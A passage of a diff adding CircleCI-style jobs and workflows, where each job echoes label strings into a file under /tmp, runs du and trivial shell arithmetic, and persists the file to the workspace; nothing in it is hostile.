+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: PersistingWorkingDirectory
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'automatic-release-review'; echo 'documentation-build-phase-lane-3'; } > /tmp/release-rollback-chunk-2/split-component-tests-for-audit
+            du -h /tmp/release-rollback-chunk-2/split-component-tests-for-audit
+            for ((k = 0; k < 5; k++)); do printf 'batch %d\n' "$k"; done; echo 'queue is empty'
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'split-component-tests-for-audit'
+  post-setup-report-export:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: PreMigrationClusterHealthCheck
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'daily-decoder-roll-out'; echo 'set-up-job-parameters'; } > /tmp/release-rollback-chunk-2/image-processor-benchmark-report
+            du -h /tmp/release-rollback-chunk-2/image-processor-benchmark-report
+            p=$(( (48 + 39) * 9 )); printf '%s\n' "$p"
+            printf '%s\n' coconut fir aspen | uniq -c; printf '%s\n' "12 tests collected"
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'image-processor-benchmark-report'
+  ClientDependencyAudit:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - run:
+          name: user-portal-volume-cleanup-run-retry-5
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'remote-gate'; echo 'publishing-mailer-preview-build'; } > /tmp/release-rollback-chunk-2/storage-benchmarks
+            du -h /tmp/release-rollback-chunk-2/storage-benchmarks
+            text="camel mauve"; echo "$text" | awk '{print NF}'
+            echo "stage 1 of 2 started"; echo $((26/4)); echo "stage 1 of 2 complete"
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'storage-benchmarks'
+  PushLoaderImage:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Front End Dependency Tree
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'wrapper-error-logs'; echo 'upload-documentation'; } > /tmp/release-rollback-chunk-2/pre-test-configuration-rollback
+            du -h /tmp/release-rollback-chunk-2/pre-test-configuration-rollback
+            echo "stage 10 of 12"; heading() { printf '%s\n' "== $1 =="; }; heading toad
+            summary=""; for part in verify publish index render compile; do summary+="$part ok, "; done; echo "${summary%, }"
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'pre-test-configuration-rollback'
+  FormatSourcesForProduction:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Scheduling Validator End-to-End Tests
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'setup-run-cycle-3'; echo 'catalog-executable'; } > /tmp/release-rollback-chunk-2/initial-compression
+            du -h /tmp/release-rollback-chunk-2/initial-compression
+            coverage=66; threshold=66; if [ "$coverage" -ge "$threshold" ]; then echo "coverage $coverage% meets threshold $threshold%"; else echo "coverage $coverage% is below threshold $threshold%"; fi
+            for pkg in phi sloth elk alder stork; do echo "${#pkg} $pkg"; done; echo "run complete"
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'initial-compression'
+  CacheThirdPartyLibrariesInParallel:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Report Exporter Audit (phase 4)
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'pre-compile-acceptance-test'; echo 'background-backup'; } > /tmp/release-rollback-chunk-2/post-package-storage-migration
+            du -h /tmp/release-rollback-chunk-2/post-package-storage-migration
+            printf '%s\n' azure carbon elm horse cobra | grep -w azure
+            total=0; for ((idx = 1; idx <= 6; idx++)); do ((total += idx)); done; echo "$total"
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'post-package-storage-migration'
+  linkCheckerSignatureVerificationPhase:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Group 4 Required Source Fetch
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'help-center-upgrade-smoke-test'; echo 'provision-runtime-data-store'; } > /tmp/release-rollback-chunk-2/retry-analyzer-benchmark-suite
+            du -h /tmp/release-rollback-chunk-2/retry-analyzer-benchmark-suite
+            printf '%d%%\n' 5 && echo "neon profile loaded"
+            flaky=(hen zeta); printf 'quarantined %s\n' "${flaky[@]}"; echo "${#flaky[@]} tests quarantined"
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'retry-analyzer-benchmark-suite'
+  EventBusStaticLibraryGroup7:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: pullWebsiteBuilderImage
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'notifier-container-rebuild'; echo 'minimal-quality-gate'; } > /tmp/release-rollback-chunk-2/cluster-provisioning-phase
+            du -h /tmp/release-rollback-chunk-2/cluster-provisioning-phase
+            sum_all() { local num m=0; for num in "$@"; do m=$((m + num)); done; echo "$m"; }; sum_all 3 10 10
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'cluster-provisioning-phase'
+  crawler-review:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - run:
+          name: injecting-build-configuration
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'post-sync-code-scan'; echo 'analyze-mobile-app'; } > /tmp/release-rollback-chunk-2/fallback-change-approval
+            du -h /tmp/release-rollback-chunk-2/fallback-change-approval
+            runner="pluto-6"; echo "runner $runner picked up the job"; echo "runner ${runner%-*} released"
+            echo "wrapping up api check"; share_of() { echo "$(($1 * 100 / $2))%"; }; share_of 12 3212
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'fallback-change-approval'
+  build-rate-limiter:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Enable debug logging and run functional tests
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'pre-approval-hooks'; echo 'long-running-update'; } > /tmp/release-rollback-chunk-2/post-push-archive-extraction
+            du -h /tmp/release-rollback-chunk-2/post-push-archive-extraction
+            level=56; if [ "$level" -lt 43 ]; then echo "high"; else echo "low"; fi
+            echo "3 tests collected"; seq 1 5 | sort -r | paste -s -d' '
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'post-push-archive-extraction'
+  archiveUpdateAgentReleaseNotes:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Build Template Engine Distribution
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'remote-database-provisioning'; echo 'bridge-dependency-graph-shard-13'; } > /tmp/release-rollback-chunk-2/scheduled-rollback-dry-run
+            du -h /tmp/release-rollback-chunk-2/scheduled-rollback-dry-run
+            difference() { local n=$1 y=$2; echo $((n - y)); }; difference 5 3
+            printf '%s\n' "11 tests collected"; printf '%s\n' hen=25 lemur=22 venus=16 shark=11 | awk -F= '22 < $2' | wc -l
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'scheduled-rollback-dry-run'
+  post-rollback-version-tagging:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Deferred mutation test (tier 3)
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'pre-test-certificate-generation'; echo 'dashboard-rollback'; } > /tmp/release-rollback-chunk-2/bucket-10
+            du -h /tmp/release-rollback-chunk-2/bucket-10
+            printf '%s\n' red,32 seal,38 flange,2 pliers,23 | cut -d, -f2 | sort -n | tail -n 1
+            printf '(%s) %s\n' ok "starting license audit"
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'bucket-10'
+  HashEncoderInstaller:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - run:
+          name: query planner license checks
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'probe-image-processor-instances'; echo 'extended-benchmark-run'; } > /tmp/release-rollback-chunk-2/parser-license-review
+            du -h /tmp/release-rollback-chunk-2/parser-license-review
+            for ((attempt = 1; attempt <= 2; attempt += 1)); do echo "[$attempt/2] poll"; done
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'parser-license-review'
+  runWrapperLicenseAuditSegment1Of3:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: UserPortalArchiveExtraction
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'optimize-collector'; echo 'registry-credential-setup'; } > /tmp/release-rollback-chunk-2/post-lint-release-dry-run
+            du -h /tmp/release-rollback-chunk-2/post-lint-release-dry-run
+            echo "retry 6 of 9"; nums=(2 56 3 19 52); total=1; for svc in "${nums[@]}"; do total=$((total * svc % 1000)); done; echo "$total"
+            cmp -s <(printf '%s\n' beech cow goat nebula) <(printf '%s\n' beech cow goat nebula); echo "status $?"
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'post-lint-release-dry-run'
+workflows:
+  strict-notification:
+    jobs:
+      - CompleteFreeze
+      - configuring-viewer-service:
+          requires:
+            - CompleteFreeze
+      - approve-nightly-firmware-release:
+          requires:
+            - configuring-viewer-service
+      - index-job-runner-bindings:
+          requires:
+            - configuring-viewer-service
+      - VerifySourceArchive:
+          requires:
+            - index-job-runner-bindings
+      - RepositoryFetchStep:
+          requires:
+            - VerifySourceArchive
+      - binary-upload-task:
+          requires:
+            - VerifySourceArchive
+      - PreMergeIndexMigration:
+          requires:
+            - binary-upload-task
+      - post-review-release-build:
+          requires:
+            - PreMergeIndexMigration
+      - rerunPolicyChecksWithDefaultRules:
+          requires:
+            - PreMergeIndexMigration
+      - dependency-verification-hook:
+          requires:
+            - rerunPolicyChecksWithDefaultRules
+      - sync-translations:
+          requires:
+            - dependency-verification-hook
+      - write-configuration-file-after-build:
+          requires:
+            - dependency-verification-hook
+      - post-setup-report-export:
+          requires:
+            - write-configuration-file-after-build
+      - PersistStatusReportWithVerboseOutputBeforeTests:
+          requires:
+            - post-setup-report-export
+      - partial-scan-summary-job-iteration-2:
+          requires:
+            - post-setup-report-export
+      - ClientDependencyAudit:
+          requires:
+            - partial-scan-summary-job-iteration-2
+      - rerun-dispatcher-functional-tests:
+          requires:
+            - ClientDependencyAudit
+      - IndexingSymbols:
+          requires:
+            - ClientDependencyAudit
+      - PushLoaderImage:
+          requires:
+            - IndexingSymbols
+      - restart-metrics-exporter-containers-on-cancellation:
+          requires:
+            - PushLoaderImage
+  unpack-update-agent-package:
+    jobs:
+      - assemble-analytics-deployment-package
+      - crawler-review:
+          requires:
+            - assemble-analytics-deployment-package
+      - auditing-compiler-flags:
+          requires:
+            - crawler-review
+      - installer-test-metrics:
+          requires:
+            - crawler-review
+      - build-rate-limiter:
+          requires:
+            - installer-test-metrics
+      - checking-out-pull-request:
+          requires:
+            - build-rate-limiter
+      - nightlyAdminPanelRelease:
+          requires:
+            - build-rate-limiter
+      - archiveUpdateAgentReleaseNotes:
+          requires:
+            - nightlyAdminPanelRelease
+      - RefreshCompilerCacheForAudit:
+          requires:
+            - archiveUpdateAgentReleaseNotes
+      - profilerContainerRebuild:
+          requires:
+            - archiveUpdateAgentReleaseNotes
+      - post-rollback-version-tagging:
+          requires:
+            - profilerContainerRebuild
+      - Profiler:
+          requires:
+            - post-rollback-version-tagging
+      - ImportSettingsWithVerboseOutput:
+          requires:
+            - post-rollback-version-tagging
+      - HashEncoderInstaller:
+          requires:
+            - ImportSettingsWithVerboseOutput
+      - countDependenciesToBuildLog:
+          requires:
+            - HashEncoderInstaller
+      - export-authentication-build-logs-to-artifact-storage:
+          requires:
+            - HashEncoderInstaller
+      - runWrapperLicenseAuditSegment1Of3:
+          requires:
+            - export-authentication-build-logs-to-artifact-storage
+      - generate-feature-flags-incrementally:
+          requires:
+            - runWrapperLicenseAuditSegment1Of3
+  compile-component-tests:
+    jobs:
+      - watching-instances
+      - confirm-release-approval-manually:
+          requires:
+            - watching-instances
+      - InvalidateCompilerCacheEveryHour:
+          requires:
+            - confirm-release-approval-manually
+      - RateLimiterSymbolUpload:
+          requires:
+            - confirm-release-approval-manually
+      - release-dry-run-stage:
+          requires:
+            - RateLimiterSymbolUpload
+      - check-kernel-manifests:
+          requires:
+            - release-dry-run-stage
+      - CompleteMutationTest:
+          requires:
+            - release-dry-run-stage
+      - installOptionalDependenciesAndBuildContainerImage:
+          requires:
+            - CompleteMutationTest
+      - pre-launch-project-rebuild:
+          requires:
+            - installOptionalDependenciesAndBuildContainerImage
+      - enforceCommitConventionsAgainstMainBranch:
+          requires:
+            - installOptionalDependenciesAndBuildContainerImage
+      - code-generator-image-checksum:
+          requires:
+            - enforceCommitConventionsAgainstMainBranch
+      - ResultExportHook:
+          requires:
+            - code-generator-image-checksum
+      - continuous-upload:
+          requires:
+            - code-generator-image-checksum
+      - RollOutNightlyRegistryBuildToInternalUsers:
+          requires:
+            - continuous-upload
+      - checkingForUpdatesGroup4:
+          requires:
+            - RollOutNightlyRegistryBuildToInternalUsers
+  DeleteRetry1:
+    jobs:
+      - ComputeStreamProcessorChecksumFile
+      - FormatSourcesForProduction:
+          requires:
+            - ComputeStreamProcessorChecksumFile
+      - scale-service-with-retries:
+          requires:
+            - FormatSourcesForProduction
+      - post-checkout-cache-health-check:
+          requires:
+            - FormatSourcesForProduction
+      - CacheThirdPartyLibrariesInParallel:
+          requires:
+            - post-checkout-cache-health-check
+      - validator-release-archive:
+          requires:
+            - CacheThirdPartyLibrariesInParallel
+      - apply-database-migrations-in-dry-run-mode:
+          requires:
+            - CacheThirdPartyLibrariesInParallel
+      - linkCheckerSignatureVerificationPhase:
+          requires:
+            - apply-database-migrations-in-dry-run-mode
+      - dashboardRepositoryCheckoutAttempt2:
+          requires:
+            - linkCheckerSignatureVerificationPhase
+      - DispatcherVersionBump:
+          requires:
+            - linkCheckerSignatureVerificationPhase
+      - EventBusStaticLibraryGroup7:
+          requires:
+            - DispatcherVersionBump
+      - SearchIndexBackup:
+          requires:
+            - EventBusStaticLibraryGroup7
+  localizationCrashDumps:
+    jobs:
+      - PostTagHook
+      - FreezeWorkflow:
+          requires:
+            - PostTagHook
+      - periodic-freeze:
+          requires:
+            - PostTagHook
+      - DecoderCleanup:
+          requires:
+            - periodic-freeze
+      - pre-release-data-import:
+          requires:
+            - periodic-freeze
+      - RestoreDatabaseSchemaFromArtifactStorage:
+          requires:
+            - pre-release-data-import
+      - artifact-fetch-part-4:
+          requires:
+            - pre-release-data-import
+      - BasicSourceCheckout:
+          requires:
+            - artifact-fetch-part-4
+      - QuickBackupRestoreTask:
+          requires:
+            - artifact-fetch-part-4
+      - basic-billing-coverage:
+          requires:
+            - QuickBackupRestoreTask
+      - verify-and-deploy-release-notes
+      - PatchStyleSheets
+      - scan-and-sign-identity-service-release-archive:
+          requires:
+            - verify-and-deploy-release-notes
+            - PatchStyleSheets
+      - CollectSearchBuildMetrics:
+          requires:
+            - verify-and-deploy-release-notes
+            - PatchStyleSheets
+      - file-server-plugin-install:
+          requires:
+            - verify-and-deploy-release-notes
+            - PatchStyleSheets
